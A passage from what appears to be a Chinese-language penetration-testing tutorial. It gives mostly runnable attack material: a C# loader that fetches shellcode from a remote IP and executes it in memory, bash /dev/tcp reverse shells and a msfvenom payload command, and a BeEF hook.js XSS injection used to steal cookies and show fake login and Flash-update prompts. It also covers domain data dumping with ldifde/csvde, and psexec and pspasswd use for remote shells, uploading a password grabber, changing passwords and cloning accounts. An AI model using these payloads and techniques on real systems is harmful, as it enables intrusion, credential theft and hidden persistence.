    <span class="token keyword">return</span> mwxyRsYNn;<span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hcvPkmyIZ</span><span class="token punctuation">(</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span> fPnfqu<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fPnfqu <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        UInt32 hcoGPUltNcjK <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span>UInt32<span class="token punctuation">)</span>fPnfqu<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>;
        Marshal<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>fPnfqu<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>IntPtr<span class="token punctuation">)</span><span class="token punctuation">(</span>hcoGPUltNcjK<span class="token punctuation">)</span><span class="token punctuation">,</span> fPnfqu<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>;
        IntPtr xOxEPnqW <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero; 
        UInt32 ooiiZLMzO <span class="token operator">=</span> <span class="token number">0</span>;
        IntPtr wxPyud <span class="token operator">=</span> IntPtr<span class="token punctuation">.</span>Zero;
        xOxEPnqW <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> hcoGPUltNcjK<span class="token punctuation">,</span> wxPyud<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ref ooiiZLMzO<span class="token punctuation">)</span>;
        <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>xOxEPnqW<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span>; <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    byte<span class="token punctuation">[</span><span class="token punctuation">]</span> dCwAid <span class="token operator">=</span> null; dCwAid <span class="token operator">=</span> <span class="token function">idCWVw</span><span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span> xx<span class="token punctuation">)</span>;
    <span class="token function">hcvPkmyIZ</span><span class="token punctuation">(</span>dCwAid<span class="token punctuation">)</span>; <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>UInt32 qWBbOS<span class="token punctuation">,</span>UInt32 HoKzSHMU<span class="token punctuation">,</span> UInt <span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>private <span class="token keyword">static</span> <span class="token keyword">extern</span>
IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 tqUXybrozZ<span class="token punctuation">,</span> UInt32 FMmVpwin<span class="token punctuation">,</span> UInt32 H
<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32
<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr CApwDwK<span class="token punctuation">,</span> UInt32 uzGJUddCYTd<span class="token punctuation">)</span>;
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162619591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、Bash-payload</strong></p>
<pre><code class="prism language-c">i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token operator">/</span>xx <span class="token number">0</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">1</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162638122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">exec <span class="token number">5</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token operator">/</span>xx
cat <span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token number">5</span> <span class="token operator">|</span> <span class="token keyword">while</span> read line; <span class="token keyword">do</span> $line <span class="token number">2</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">5</span> <span class="token operator">&gt;</span><span class="token operator">&amp;</span><span class="token number">5</span>;done
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162650532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
附录：<br>
<strong>msfvenom 生成 bash</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span><span class="token operator">~</span># msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash LHOST<span class="token operator">=</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span><span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx LPORT<span class="token operator">=</span>xx <span class="token operator">&gt;</span> <span class="token operator">-</span>f raw <span class="token operator">&gt;</span> payload<span class="token punctuation">.</span>sh
</code></pre>
<p>参数简化 项目地址：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>g0tmi1k<span class="token operator">/</span>mpc
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009162714173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="108_ldifde__3483"></a>10.8 域信息收集之普通域用户权限获取域里详细信息-ldifde 工具</h2>
<p><strong>前沿</strong></p>
<p>适用场景：內网环境有域环境,掌握一个域用户的账号密码作用：能够把域里面的所有信息导出来(域用户域机器等详细信息)</p>
<p><strong>使用</strong></p>
<pre><code class="prism language-c">ldifde<span class="token punctuation">.</span>exe <span class="token operator">-</span>f 导出的文件名 <span class="token operator">-</span>s 域控IP <span class="token operator">-</span>b 普通域用户名 域名 普通域用户密码

ldifde<span class="token punctuation">.</span>exe <span class="token operator">-</span>f out<span class="token punctuation">.</span>ldf <span class="token operator">-</span>s <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.2</span> <span class="token operator">-</span>b iis_user hack <span class="token number">1</span>qaz@WSX
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009212329288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
包含了很多域信息…</p>
<hr>
<h2><a id="109_csvde_3501"></a>10.9 域信息收集-csvde工具</h2>
<p><strong>CSVDE</strong></p>
<p>利用csvde命令导出域的信息，导出文件一般以csv结尾，这个命令好像安装了活动目录才有</p>
<pre><code class="prism language-c">csvde <span class="token operator">-</span>setspn <span class="token punctuation">[</span>域名<span class="token punctuation">]</span> <span class="token operator">-</span>f <span class="token punctuation">[</span>导出路径<span class="token punctuation">]</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201009212723831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/202010092127307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>jianshu<span class="token punctuation">.</span>com<span class="token operator">/</span>p<span class="token operator">/</span>e8db802e0ac3
</code></pre>
<hr>
<h2><a id="1010_XSSBee_3517"></a>10.10 XSS之Bee神器</h2>
<p><strong>1、前言</strong></p>
<p>Beef 是目前最为流行的 web 框架攻击平台，专注于利用浏览器漏洞，它的全称是 The Browser Exploitation Framework。</p>
<p>Beef提供一个 web 界面供操作，只要访问了嵌入 hook.js 页面，亦或者加载了 hook.js 文件的浏览器，就会不断的以 GET 的方式将其自身的相关消息到 BeEF 的 server 端</p>
<p><img src="https://img-blog.csdnimg.cn/20201009212905669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009212911922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>2、利用</strong></p>
<p><strong>上线</strong></p>
<p>往存在XSS漏洞的地方插入以下代码</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://192.168.168.237:3000/hook.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre>
<p>当然xss的payload要根据是否存在waf做相对应的绕过，核心就是加载该hook.js代码</p>
<p>例如：往dvwa靶场插入xss代码<br>
<img src="https://img-blog.csdnimg.cn/20201009213117898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
那么在beef上可以看到浏览器已经上线了</p>
<p><img src="https://img-blog.csdnimg.cn/20201009213129657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>可以选择各种工具模块<br>
<img src="https://img-blog.csdnimg.cn/20201009213136770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
每个模块前面的颜色代表着不同的意义<br>
<img src="https://img-blog.csdnimg.cn/20201009213148690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213156691.png#pic_center" alt="在这里插入图片描述"><br>
尝试往被控浏览器弹框<br>
<img src="https://img-blog.csdnimg.cn/20201009213245570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213250954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
获取cookie</p>
<p><img src="https://img-blog.csdnimg.cn/20201009213301316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>重定向</p>
<p>被控浏览器跳转到百度<br>
<img src="https://img-blog.csdnimg.cn/20201009213307654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
社工弹窗</p>
<p>弹出一个登录框，用户输入密码点击登录之后，beef可以获取到密码<br>
<img src="https://img-blog.csdnimg.cn/20201009213320829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213326397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213335191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>持久化</strong></p>
<p>目标无论点击哪里，都无法跳转到该系统到其他页面<br>
<img src="https://img-blog.csdnimg.cn/20201009213348642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213353779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>社会工程学攻击</strong></p>
<p>在社工这一栏，可以选择flash更新这类功能来诱使用户升级Flash，当用户点击之后，会下载我们的恶意文件执行，这样我们就可以用c2控制用户的系统<br>
<img src="https://img-blog.csdnimg.cn/20201009213406933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213412107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>内网扫描</strong></p>
<p>Network用于收集内网信息，比如ping、端口扫描<br>
<img src="https://img-blog.csdnimg.cn/20201009213425130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201009213430872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1011_%09Pstools__3583"></a>10.11 	Pstools 讲解</h2>
<p>其实接触pstool很久了，但是据我观察用pstools套件在渗透中的应用的介绍却比较少。</p>
<p>当然玩bt5的同学可能常常用到，小菜就写一篇关于pstools套件在渗透中的应用进行详解。</p>
<p>pstool的介绍</p>
<p>PsTools是Sysinternals Suite中一款排名靠前的一个安全管理工具套件。现在被微软收购。目前pstools中含有12款各式各样的小工具。如果将它们灵活的运用，将会在渗透中收到奇效。所有的pstool第一次运行时都会弹框。可以用–accepteula这个参数绕过。</p>
<p>还有所有的pstool都支持<code>IP$</code>，一旦<code>IP$</code>共享是连接的就不用输入-u 和-p这两个参数。</p>
<p>如何建立<code>IP$</code>连接。命令如下：</p>
<pre><code class="prism language-c">Net user \\目标ip\ 密码 <span class="token operator">/</span>user<span class="token punctuation">:</span>用户

Net user \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span>\ <span class="token number">123456</span> <span class="token operator">/</span>user<span class="token punctuation">:</span>test
</code></pre>
<p>建立后所有的ps工具都将可以不用输入用户和密码了。</p>
<p><strong>其中12款工具简介如下：</strong></p>
<pre><code class="prism language-c">◆PsExec <span class="token operator">-</span> 远程执行进程

◆PsFile <span class="token operator">-</span> 显示远程打开的文件

◆PsGetSid <span class="token operator">-</span> 显示计算机或用户的 SID

◆PsInfo <span class="token operator">-</span> 列出有关系统的信息

◆PsKill <span class="token operator">-</span> 按名称或进程 ID 终止进程

◆PsList <span class="token operator">-</span> 列出有关进程的详细信息

◆PsLoggedOn <span class="token operator">-</span> 查看在本地通过资源共享（包含所有资源）登录的用户

◆PsLogList <span class="token operator">-</span> 转储事件日志记录

◆PsPasswd － 更改帐户密码

◆PsService <span class="token operator">-</span> 查看和控制服务

◆PsShutdown <span class="token operator">-</span> 关闭并重新启动（可选）计算机

◆PsSuspend <span class="token operator">-</span> 暂停进程
</code></pre>
<p>这里讲对其中的几个工具进行详解，其他的将只介绍用法。</p>
<p>下载地址：<code>http://download.sysinternals.com/files/PSTools.zip</code></p>
<p><strong>psexec的应用详解</strong></p>
<p>Pstools中最强大最常利用的工具就属psexec这款工具。这款工具的本意是替代telnet这种不安全的管理方式。它最大的特点就属无需安装客服端程序就可以远程操作服务器。</p>
<p>简单来说，就是一旦你知道服务器或者电脑的用户名和密码，你就可以利用它远程执行系统命令。这样一款工具放到渗透当中真是太淫荡了。它适用于windows NT/2x/xp/vista</p>
<p><strong>下面介绍详细参数：</strong></p>
<pre><code class="prism language-c"><span class="token operator">-</span>u 远程计算机的用户名

<span class="token operator">-</span>p 远程计算机用户对应密码

<span class="token operator">-</span>c 拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）

<span class="token operator">-</span>d 不等待程序执行完就返回 （意思就是，当你执行一个程序无需等到他结束才返回信息）

<span class="token operator">-</span>h 用于目标系统是Vista或更高版本
</code></pre>
<p>其他参数就不做介绍，这里主要是讲用法。</p>
<p>远程获取一个cmdshell</p>
<p>比如我再渗透中扫描到目标机（192.168.1.3）的一个用户名（test）和密码（123456）。</p>
<p><strong>那我们的命令就是：</strong></p>
<pre><code class="prism language-c">psexec \\目标ip <span class="token operator">-</span>u 用户名 <span class="token operator">-</span>p 密码 进程名

psexec \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u test –p <span class="token number">123456</span> cmd<span class="token punctuation">.</span>exe
</code></pre>
<p>看下图，这是成功连接到一台远程服务器，并获得一个cmdshell，shell权限即位当前用户权限<br>
<img src="https://img-blog.csdnimg.cn/20201009221427144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
这里还将提到的是由于windows策略，将不允许空密码登陆。<br>
<img src="https://img-blog.csdnimg.cn/20201009221440553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可能有些机油对用户权限登陆还有疑虑，什么用户才可以登陆。<br>
我这建立了一个属于guest的一个用户我们来看看它是否能连接</p>
<p><img src="https://img-blog.csdnimg.cn/20201009221457647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
经过测试，比guest权限大的用户组都可以远程登陆。</p>
<p>IIS_WPG用户组的无法远程连接，但是你不用担心，一般属于IIS_WPG用户组的用户一般也属于guest用户组。</p>
<p>有关用户组相关的介绍请围观法客周年庆之提权专题</p>
<p>下载地址：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">2</span>cto<span class="token punctuation">.</span>com<span class="token operator">/</span>ebook<span class="token operator">/</span><span class="token number">201211</span><span class="token operator">/</span><span class="token number">35554.</span>html
</code></pre>
<p>获取cmdshell的介绍就到这里。一旦获得一个cmdshell后面的渗透将会比较轻松。</p>
<p>经过测试，用最新版的pstools，windows2008 win7 都能连接成功，win8由于没有win8系统，就未测试，应该是能行的，毕竟这是微软的管理工具。</p>
<p><strong>Win7连接示意图：</strong><br>
<img src="https://img-blog.csdnimg.cn/20201009221517982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
程序上传并执行</p>
<p>首先现在在本地配置一个将上传到服务器上运行的程序到H盘根目录。这里用抓取系统密码的神器getpass来演示。H:\getpass.exe<br>
<img src="https://img-blog.csdnimg.cn/2020100922153024.png#pic_center" alt="在这里插入图片描述"><br>
程序上传并执行命令如下：</p>
<pre><code class="prism language-c">Psexec \\<span class="token number">192.169</span><span class="token number">.1</span><span class="token number">.3</span> –u test –p <span class="token number">12345</span> –c H<span class="token punctuation">:</span>\getpass<span class="token punctuation">.</span>exe –d
</code></pre>
<p>最后一个-d的参数可有可无~~~</p>
<p>只是怕程序远程运行后会卡住而无法返回信息。</p>
<p><strong>测试如图：</strong><br>
<img src="https://img-blog.csdnimg.cn/2020100922154360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
当然你也可运行一个远控木马这些都可以~~~</p>
<p>Psexec 的介绍就到这里了。</p>
<p>pspasswd的应用详解</p>
<p>Pspasswd是一个用来更改用户密码的工具，支持远程密码修改和本地密码修改。这款工具的特点就是不依靠net,exe程序进行密码修改。</p>
<p>本地修改命令如下：</p>
<pre><code class="prism language-c">pspasswd administrator yueyan
</code></pre>
<p><strong>演示图如下：</strong><br>
<img src="https://img-blog.csdnimg.cn/2020100922160262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
远程命令如下：</p>
<pre><code class="prism language-c">pspasswd \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u administrator –p <span class="token number">123456</span> guest yueyan
</code></pre>
<p>命令的意思就是，用administrator这个管理员账户登录后修改用户guest的密码为yueyan</p>
<p>相对来说本地修改密码的功能更强大一些。</p>
<p><strong>我这将介绍个实例：</strong></p>
<p>我的一个好基友Lynn得到一个jsp马，并且是nt authority\system权限。但是无法添加用户，且无法用net修改管理员密码。抓取hash密码大于14位，LMhash无效，本地又为搭建彩虹表，网上破解无果。Hash传递登陆被拦截。但是机油lynn却一直想用administrator这个用户登陆进去，当然方法还有很多，比如： mimikatz.exe抓取明文密码等，这里我将介绍pspasswd的妙用。</p>
<p>我们想用administrator这个账户登陆进去。很简单，直接上传一个pspasswd上服务器。</p>
<p>执行下面的命令：</p>
<p>首先执行<code>D:\web|pspasswd.exe –accepteula</code> （第一次执行，表示许可执行的意思）</p>
<pre><code class="prism language-c">D<span class="token punctuation">:</span>\web<span class="token operator">|</span>pspasswd<span class="token punctuation">.</span>exe administrator yueyan
</code></pre>
<p>就会成功修改administrator的密码。</p>
<p>这里能修改密码的原因是pspasswd不是调用net.exe进行密码修改。</p>
<p><strong>上述介绍常常配合mt.exe进行用户克隆。这里简单介绍：</strong></p>
<p>（关于mt.exe的详细介绍请访问：【工具】mt.exe的详细介绍）</p>
<p>首先mt.exe查看用户sid，比较后看是否有克隆账户</p>
<pre><code class="prism language-c">Mt <span class="token operator">-</span>chkuser
</code></pre>
<p>比较后，没有克隆账户，我们选择guest这个账户进行克隆：</p>
<pre><code class="prism language-c">Mt –clone administrator guest
</code></pre>
<p>然后配合pspasswd修改密码：</p>
<pre><code class="prism language-c">Pspasswd guest yueyan
</code></pre>
<p>就这样成功克隆一个账户，并能成功登陆访问。</p>
<p><img src="https://img-blog.csdnimg.cn/20201009221704735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
Pspasswd的功能就介绍到这里。</p>
<p><strong>pskill+psinfo+pslist的应用详解</strong></p>
<p>首先是介绍pskill.</p>
<p>如果你想远程结束远程主机上的一个进程，你可以使用pskill。</p>
<p>我们就介绍一下常用的命令：</p>
<p>比如我们想远程关闭远程主机正在运行的cmd这个进程，可以用pskill进行杀掉。命令如下：</p>
<pre><code class="prism language-c">pskill \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u test –p <span class="token number">123456</span> cmd<span class="token punctuation">.</span>exe
</code></pre>
<p>命令很简单~~~~<br>
<img src="https://img-blog.csdnimg.cn/20201009221728239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
我再介绍psinfo的相关应用。</p>
<p>基本参数是：</p>
<pre><code class="prism language-c"><span class="token operator">-</span>h 显示已经安装的补丁信息

<span class="token operator">-</span>s 显示已安装的软件信息

<span class="token operator">-</span>d 显示磁盘信息
</code></pre>
<p>如果我们想看远程主机的基本信息，命令如下：</p>
<pre><code class="prism language-c">psinfo –h –s –d \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u administrator –p <span class="token number">123456</span>
</code></pre>
<p>接下来就是pslist。<br>
<img src="https://img-blog.csdnimg.cn/20201009221746461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
主要特点是，显示本地或者远程计算机的进程运行情况。</p>
<p>主要参数：</p>
<pre><code class="prism language-c"><span class="token operator">-</span>m 显示内存信息

<span class="token operator">-</span>x 显示进程，内存和线程

<span class="token operator">-</span>t 显示进程树

<span class="token operator">-</span>s n 在任务管理器模式先运行，n指定秒，以esc结束。

<span class="token operator">-</span>r n 任务管理器模式刷新速率，n指秒
</code></pre>
<p>例如我们想看远程计算机的进程运行情况，命令如下：</p>
<pre><code class="prism language-c">Pslist –x \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.3</span> –u test –p <span class="token number">123456</span>
</code></pre>
<p>效果图如下：<br>
<img src="https://img-blog.csdnimg.cn/20201009221805914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
